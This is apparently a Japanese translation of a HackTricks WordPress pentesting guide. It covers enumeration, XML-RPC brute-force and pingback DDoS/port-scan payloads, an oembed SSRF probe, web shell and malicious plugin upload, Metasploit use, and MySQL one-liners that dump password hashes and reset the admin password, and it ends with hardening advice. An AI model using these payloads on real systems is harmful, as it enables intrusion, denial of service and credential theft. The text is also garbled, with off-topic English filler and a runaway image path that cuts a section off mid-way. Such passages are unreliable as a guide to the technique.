# Wordpress

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
[**Trickest**](https://trickest.io/)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 基本情報

**アップロード**されたファイルは次の場所に保存されます：`http://10.10.10.10/wp-content/uploads/2018/08/a.txt`\
**テーマファイルは/wp-content/themes/にあります**ので、テーマのphpを変更してRCEを取得する場合は、おそらくこのパスを使用することになります。例えば：**twentytwelveテーマ**を使用して、次の場所にある**404.php**ファイルにアクセスできます：[**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)\
**別の有用なURL**は次のとおりです：[**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

**wp-config.php**にはデータベースのルートパスワードが記載されています。

確認するためのデフォルトのログインパス：_**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **メインのWordPressファイル**

* `index.php`
* `license.txt`には、インストールされているWordPressのバージョンなど、有用な情報が含まれています。
* `wp-activate.php`は、新しいWordPressサイトの設定時にメールアクティベーションプロセスに使用されます。
* ログインフォルダ（非表示にするために名前が変更される場合があります）：
* `/wp-admin/login.php`
* `/wp-admin/wp-login.php`
* `/login.php`
* `/wp-login.php`
* `xmlrpc.php`は、WordPressの機能を表すファイルで、HTTPをトランスポートメカニズムとして、XMLをエンコーディングメカニズムとして使用してデータを送信することができます。このタイプの通信は、WordPressの[REST API](https://developer.wordpress.org/rest-api/reference)によって置き換えられました。
* `wp-content`フォルダは、プラグインとテーマが保存されるメインディレクトリです。
* `wp-content/uploads/`は、プラットフォームにアップロードされたファイルが保存されるディレクトリです。
* `wp-includes/`は、証明書、フォント、JavaScriptファイル、ウィジェットなどのコアファイルが保存されるディレクトリです。

**ポストエクスプロイテーション**

* `wp-config.php`ファイルには、WordPressがデータベースに接続するために必要な情報が含まれています。データベース名、データベースホスト、ユーザー名とパスワード、認証キーとソルト、およびデータベーステーブルの接頭辞などです。この設定ファイルは、トラブルシューティングに役立つDEBUGモードをアクティブにするためにも使用できます。

### ユーザーの権限

* **管理者**
* **エディター**：自分自身と他の投稿を公開および管理します。
* **著者**：自分自身の投稿を公開および管理します。
* **寄稿者**：自分の投稿を書いて管理しますが、公開することはできません。
* **購読者**：投稿を閲覧し、プロフィールを編集します。

## パッシブエナメレーション

### WordPressのバージョンを取得する

`/license.txt`または`/readme.html`のファイルを見つけることができるかどうかを確認します。

ページの**ソースコード**内（例：[https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)からの例）：

* grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
* `meta name`

![](<../../.gitbook/assets/image (343).png>)

* CSSリンクファイル

![](<../../.gitbook/assets/image (344).png>)

* JavaScriptファイル

![](<../../.gitbook/assets/image (346).png>)

### プラグインを取得する
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### テーマの取得

To get themes in WordPress, you can follow these steps:

1. Log in to the WordPress admin dashboard.
2. Go to the "Appearance" section and click on "Themes".
3. Here, you will see a list of installed themes. To add a new theme, click on the "Add New" button.
4. You can browse through the available themes or use the search bar to find a specific theme.
5. Once you find a theme you like, hover over it and click on the "Install" button.
6. After the theme is installed, you can activate it by clicking on the "Activate" button.

By following these steps, you can easily get and install new themes for your WordPress website.
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### 一般的なバージョンの抽出

To extract versions in general, you can try the following methods:

1. **Check the source code**: Look for version information in the source code of the WordPress installation. This can be found in files like `readme.html` or `wp-includes/version.php`.

2. **Inspect HTTP headers**: Use tools like `curl` or browser extensions to inspect the HTTP headers of the WordPress site. Look for headers like `X-Powered-By` or `X-Generator` that may reveal the version information.

3. **Search for version-specific files**: Some WordPress versions have specific files or directories that can be used to identify the version. For example, the presence of the `wp-includes/js/tinymce/wp-tinymce.php` file indicates a version prior to 3.9.

4. **Analyze error messages**: Error messages displayed by WordPress can sometimes reveal version information. For example, an error message like "WordPress database error" followed by a specific version number can indicate the version being used.

Remember to cross-reference the information obtained from different methods to ensure accuracy.
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
[**Trickest**](https://trickest.io/)を使用して、世界で最も高度なコミュニティツールによって強化されたワークフローを簡単に構築し、自動化することができます。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## アクティブな列挙

### プラグインとテーマ

おそらく、すべてのプラグインとテーマを見つけることはできません。すべてを発見するには、プラグインとテーマのリストを**アクティブにブルートフォースする**必要があります（幸いなことに、このリストを含む自動化ツールがあります）。

### ユーザー

**IDブルート**

WordPressサイトから有効なユーザーを取得するには、ユーザーIDをブルートフォースします：
```
curl -s -I -X GET http://blog.example.com/?author=1
```
もしレスポンスが**200**または**30X**であれば、それはidが**有効**であることを意味します。もしレスポンスが**400**であれば、idは**無効**です。

**wp-json**

また、ユーザーに関する情報を取得するために、以下のようにクエリを試すこともできます。
```
curl http://blog.example.com/wp-json/wp/v2/users
```
**この機能を有効にしているユーザーに関する情報のみ提供されます**。

また、**/wp-json/wp/v2/pages**はIPアドレスを漏洩する可能性があります。

#### ログインユーザー名の列挙

**`/wp-login.php`**にログインする際、**メッセージ**は、指定された**ユーザー名が存在するかどうかによって異なります**。

### XML-RPC

`xml-rpc.php`がアクティブな場合、資格情報のブルートフォース攻撃を実行したり、他のリソースへのDoS攻撃を行ったりすることができます（たとえば、[こちら](https://github.com/relarizky/wpxploit)を使用してこのプロセスを自動化することができます）。

アクティブかどうかを確認するには、_**/xmlrpc.php**_にアクセスし、次のリクエストを送信してください：

**チェック**
```markup
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**資格情報のブルートフォース攻撃**

**`wp.getUserBlogs`**、**`wp.getCategories`**または**`metaWeblog.getUsersBlogs`**は、資格情報のブルートフォース攻撃に使用できるいくつかのメソッドです。これらのいずれかを見つけることができれば、次のようなものを送信することができます。
```markup
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
正しいユーザー名とパスワードを使用しない場合、200コードの応答内には「ユーザー名またはパスワードが正しくありません」というメッセージが表示されます。

![](<../../.gitbook/assets/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)
```markup
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
また、同じリクエストで複数の資格情報を試すことができるため、**`system.multicall`**を使用して資格情報のブルートフォース攻撃を行う**より速い方法**があります。

<figure><img src="../../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>

**2FAのバイパス**

この方法はプログラム向けであり、人間向けではなく、古いため2FAをサポートしていません。したがって、有効な資格情報を持っているが、メインの入り口が2FAで保護されている場合、**xmlrpc.phpを悪用して2FAをバイパスしてログインすることができる**かもしれません。ただし、コンソールを介して行えるすべてのアクションを実行することはできませんが、Ippsecが[https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s)で説明しているように、まだRCEに到達することができるかもしれません。

**DDoSまたはポートスキャン**

リスト内に_**pingback.ping**_メソッドを見つけることができれば、Wordpressに任意のホスト/ポートに対してリクエストを送信させることができます。これを使用して、Wordpressの**数千のサイト**に特定の**場所**（したがって、その場所で**DDoS**が発生する）への**アクセス**を要求することができます。または、Wordpressに内部の**ネットワーク**をスキャンさせることもできます（任意のポートを指定できます）。
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../.gitbook/assets/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

もし**faultCode**の値が**0**よりも**大きい**（17）場合、それはポートが開いていることを意味します。

**`system.multicall`**の使用方法を前のセクションで確認して、このメソッドを乱用してDDoS攻撃を引き起こす方法を学びましょう。

**DDoS**
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../.gitbook/assets/image (103).png>)

### wp-cron.php DoS

このファイルは通常、Wordpressサイトのルートに存在します：**`/wp-cron.php`**\
このファイルに**アクセス**すると、**重い**MySQL **クエリ**が実行されるため、**攻撃者**はこれを使用して**DoS**を引き起こすことができます。\
また、デフォルトでは、`wp-cron.php`はすべてのページロード（クライアントがWordpressの任意のページをリクエストするたびに）で呼び出されるため、高トラフィックのサイトでは問題を引き起こす可能性があります（DoS）。

Wp-Cronを無効にし、ホスト内に必要なアクションを定期的に実行する実際のcronjobを作成することが推奨されています（問題を引き起こさずに）。

### /wp-json/oembed/1.0/proxy - SSRF

_https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ にアクセスして、Wordpressサイトがリクエストを行う可能性があります。

これは機能しない場合の応答です：

![](<../../.gitbook/assets/image (184) (1).png>)

### SSRF

{% embed url="https://github.com/t0gu/quickpress/blob/master/core/requests.go" %}

このツールは、**methodName: pingback.ping** とパス **/wp-json/oembed/1.0/proxy** の存在をチェックし、存在する場合はそれらを悪用しようとします。

### 自動ツール
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

[**Trickest**](https://trickest.io/)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## ビットを上書きしてアクセスを取得する

これは実際の攻撃ではなく、単なる興味です。CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man)では、任意のWordPressファイルの1ビットを反転させることができます。したがって、ファイル`/var/www/html/wp-includes/user.php`の位置`5389`のビットを反転させて、NOT（`!`）操作をNOP化することができます。
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **パネルRCE**

**使用されているテーマのphpを変更する（管理者の資格情報が必要）**

外観 → テーマエディター → 404テンプレート（右側）

phpシェルの内容を変更します：

![](<../../.gitbook/assets/image (21) (1) (1).png>)

インターネットで更新されたページにアクセスする方法を検索します。この場合、ここにアクセスする必要があります：[http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

次のコマンドを使用できます：
```
use exploit/unix/webapp/wp_admin_shell_upload
```
## プラグインRCE

### PHPプラグイン

プラグインとして.phpファイルをアップロードすることが可能かもしれません。\
例えば、次のようにしてPHPバックドアを作成します：

![](<../../.gitbook/assets/image (407).png>)

次に、新しいプラグインを追加します：

![](<../../.gitbook/assets/image (409).png>)

プラグインをアップロードし、「今すぐインストール」を押します：

![](<../../.gitbook/assets/image (411).png>)

「続行」をクリックします：

![](<../../.gitbook/assets/image (412).png>)

おそらく、これは何も起こらないように見えますが、メディアに移動すると、アップロードされたシェルが表示されます：

![](<../../.gitbook/assets/image (413).png>)

それにアクセスすると、逆シェルを実行するためのURLが表示されます：

![](<../../.gitbook/assets/image (414).png>)

### 悪意のあるプラグインのアップロードと有効化

**(この部分は** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)**からコピーされています)**

ログインユーザーにはWordPressテーマへの変更権限がない場合、ウェブシェルを取得する代替戦略として「Inject WPプラグイン悪意のある」を選択します。

したがって、WordPressのダッシュボードにアクセスできる場合、悪意のあるプラグインをインストールしてみることができます。ここでは、既に脆弱なプラグインをexploit dbからダウンロードしました。

練習用にプラグインをダウンロードするには[**ここをクリック**](https://www.exploit-db.com/exploits/36374)してください。

![](https://i1.wp.com/1.bp.blogspot.com/-Y\_Aw7zSFJZs/XY9pymSjdvI/AAAAAAAAguY/FGyGEzlx9VIqNYyyra9r55IklNmwXwMQwCLcBGAsYHQ/s1600/10.png?w=687\&ssl=1)

プラグインのzipファイルがあるので、プラグインをアップロードする準備が整いました。

ダッシュボード > プラグイン > プラグインをアップロード

![](https://i0.wp.com/1.bp.blogspot.com/-FLhqB0I32Mg/XY9pyrlKWAI/AAAAAAAAguU/tofpIetTCv4Mho5y5D\_sDuuokC7mDmKowCLcBGAsYHQ/s1600/11.png?w=687\&ssl=1)

ダウンロードしたzipファイルを参照します。

![](https://i2.wp.com/1.bp.blogspot.com/-KMumiwE2Tf0/XY9pzznEI4I/AAAAAAAAguk/BavBJP6plFo8NIpa38oWEKfx0jkOXv3HgCLcBGAsYHQ/s1600/12.png?w=687\&ssl=1)

パッケージが正常にインストールされたら、プラグインを有効化する必要があります。

![](https://i2.wp.com/1.bp.blogspot.com/-YrFg94Y2EZs/XY9pzydfLDI/AAAAAAAAgug/AjZyQ6Na8kUUmquJXwoapxcmr2-8nAMwQCLcBGAsYHQ/s1600/13.png?w=687\&ssl=1)

すべてがうまく設定されている場合は、攻撃に移ります。脆弱なプラグイン「reflex-gallery」がインストールされているため、簡単に攻撃できます。

この脆弱性のexploitはMetasploitフレームワーク内にありますので、以下のモジュールをロードし、次のコマンドを実行します：

上記のコマンドが実行されると、meterpreterセッションが開始されます。この記事で説明されているように、WordPressプラットフォームのウェブサイトを攻撃するための複数の方法があります。

![](https://i1.wp.com/1.bp.blogspot.com/-s6Yblqj-zQ8/XY9pz0qYWAI/AAAAAAAAguo/WXgEBKIB64Ian\_RQWaltbEtdzCNpexKOwCLcBGAsYHQ/s1600/14.png?w=687\&ssl=1)

## ポストエクスプロイテーション

ユーザー名とパスワードを抽出します：
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
管理者パスワードの変更方法: 

To change the admin password in WordPress, follow these steps:

1. Log in to the WordPress admin dashboard.
2. Go to the "Users" section.
3. Click on the "Edit" link next to the admin user.
4. Scroll down to the "New Password" section.
5. Enter a new password in the "New Password" field.
6. Confirm the new password by entering it again in the "Repeat New Password" field.
7. Click on the "Update User" button to save the changes.

WordPressの管理者パスワードを変更するには、以下の手順に従ってください：

1. WordPressの管理者ダッシュボードにログインします。
2. 「ユーザー」セクションに移動します。
3. 管理者ユーザーの横にある「編集」リンクをクリックします。
4. 「新しいパスワード」セクションまでスクロールします。
5. 「新しいパスワード」フィールドに新しいパスワードを入力します。
6. 「新しいパスワードを繰り返す」フィールドに再度新しいパスワードを入力して確認します。
7. 変更内容を保存するために「ユーザーを更新する」ボタンをクリックします。
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## WordPressの保護

### 定期的なアップデート

WordPress、プラグイン、テーマが最新であることを確認してください。また、wp-config.phpで自動更新が有効になっていることも確認してください。
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
また、**信頼できるWordPressのプラグインとテーマのみをインストール**してください。

### セキュリティプラグイン

* [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
* [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
* [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **その他の推奨事項**

* デフォルトの**admin**ユーザーを削除する
* **強力なパスワード**と**2FA**を使用する
* 定期的にユーザーの**権限を確認**する
* ブルートフォース攻撃を防ぐために、ログイン試行回数を**制限**する
* **`wp-admin.php`**ファイルの名前を変更し、内部からのアクセスまたは特定のIPアドレスからのみアクセスを許可する。

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
[**Trickest**](https://trickest.io/)を使用して、世界で最も高度なコミュニティツールによって強化されたワークフローを簡単に構築および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
